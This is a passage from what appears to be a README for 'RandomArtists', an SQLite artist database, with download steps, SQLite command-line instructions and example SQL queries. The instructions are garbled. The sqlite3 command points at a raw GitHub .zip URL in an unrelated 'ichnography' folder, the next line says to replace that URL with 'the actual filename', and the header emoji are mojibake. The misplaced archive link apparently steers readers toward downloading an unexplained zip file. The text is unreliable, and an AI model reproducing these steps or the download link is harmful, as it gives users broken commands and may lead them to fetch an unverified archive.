3. **Download the Database File:** Click on the desired file to start the download. 

4. **Open the Database:** After downloading, locate the SQLite database file on your computer. You can use a SQLite GUI tool to view the data or work from the command line.

## üéì How to Use RandomArtists

Once you have downloaded the database, follow these steps to get started:

1. **Install SQLite:** If you haven't done so, install SQLite on your computer.

2. **Open a Command Line Interface:** Open Terminal on macOS/Linux or Command Prompt on Windows.

3. **Navigate to the Database Location:** Use the `cd` command to change the directory to where you saved the database file. For example:
   ```bash
   cd path/to/database
   ```

4. **Load the Database:** Open the database with SQLite:
   ```bash
   sqlite3 https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip
   ```
   Replace `https://raw.githubusercontent.com/azrael2241/RandomArtists/main/ichnography/RandomArtists.zip` with the actual filename.

5. **Run a Simple Query:** Start by running a simple SQL query to see the data available:
   ```sql
   SELECT * FROM artists LIMIT 10;
   ```

This will show you the first ten artists in the database. You can now explore the data and create your own queries.

## ‚úèÔ∏è Example Queries

Here are some example SQL queries you can try out:

- **Get All Artists:**
   ```sql
   SELECT * FROM artists;
   ```

- **Find Artists by Genre:**
   ```sql
   SELECT * FROM artists WHERE genre = 'Pop';
   ```

- **Count Artists in Each Genre:**
   ```sql
   SELECT genre, COUNT(*) FROM artists GROUP BY genre;
   ```

Feel free to experiment with these queries to learn more about SQL and how to manipulate the database.
